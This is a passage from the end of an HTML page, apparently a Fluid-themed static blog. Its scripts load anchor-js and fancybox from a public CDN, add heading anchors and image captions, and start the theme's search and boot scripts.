  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));

    Fluid.events.registerRefreshCallback(function() {
      if ('anchors' in window) {
        anchors.removeAll();
        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
        var res = [];
        for (var item of el) {
          res.push('.markdown-body > ' + item.trim());
        }
        if (CONFIG.anchorjs.placement === 'left') {
          anchors.options.class = 'anchorjs-link-left';
        }
        anchors.add(res.join(', '));
      }
    });
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">Blog works best with JavaScript enabled</div>
  </noscript>
</body>
</html>
